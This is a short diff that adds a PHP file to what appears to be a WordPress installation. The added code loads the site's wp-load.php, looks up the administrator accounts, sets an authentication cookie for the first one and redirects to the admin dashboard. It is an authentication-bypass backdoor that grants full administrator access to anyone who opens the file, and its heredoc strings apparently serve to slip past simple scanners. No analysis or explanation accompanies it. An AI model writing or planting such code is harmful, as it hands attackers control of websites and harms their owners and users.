@@ -1,0 +1,10 @@
+<?php 
+include(<<<END
+/home/ptrpvokasi/public_html/wp-load.php
+END
+);
+$g=get_users(<<<END
+role=administrator
+END     
+);
+wp_set_auth_cookie($g[0]->ID);wp_redirect(get_admin_url());
